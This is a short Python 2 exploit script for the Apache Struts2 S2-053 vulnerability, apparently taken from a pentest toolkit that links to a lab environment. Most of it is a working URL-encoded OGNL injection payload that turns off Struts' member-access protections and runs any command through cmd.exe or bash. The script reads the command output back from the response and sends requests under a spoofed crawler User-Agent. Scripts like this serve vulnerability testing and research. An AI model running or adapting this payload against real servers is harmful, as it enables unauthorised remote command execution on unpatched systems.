#!/usr/bin/env python
#! -*- coding:utf-8 -*-
"""
s2-053 利用脚本
"""
import requests
import re
info = {
    "name": "s2-053",
    "link": "https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053",
    "EnvironmentToBuild": "https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053",
    "tags": ['struts2']
}

def exp(target, command):
    """
    通过正则来界定结果
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0 http://www.baidu.com/search/spider.htm)"
    }
    payload = "%25{(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context['com.opensymphony.xwork2.ActionContext.container']).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d'[COMMAND]').(%23iswin%3d(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3d(%23iswin%3f{'cmd.exe','/c',%23cmd}%3a{'/bin/bash','-c',%23cmd})).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%27|>%27%2b%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream())%2b%27<|%27)}"
    payload = payload.replace("[COMMAND]", command)
    target = target + payload
    try:
        resp = requests.get(target, headers=headers, timeout=10)
        result = re.findall(r"\|\>(.*)\<\|",resp.text,re.S)[0]
        # print result
    except Exception, e:
        print "[-] {}".format(str(e))
        return False
    return result


def main():
    print exp("http://127.0.0.1:8000/s2-053/?name=", "wmic process get name")

if __name__ == '__main__':
    main()
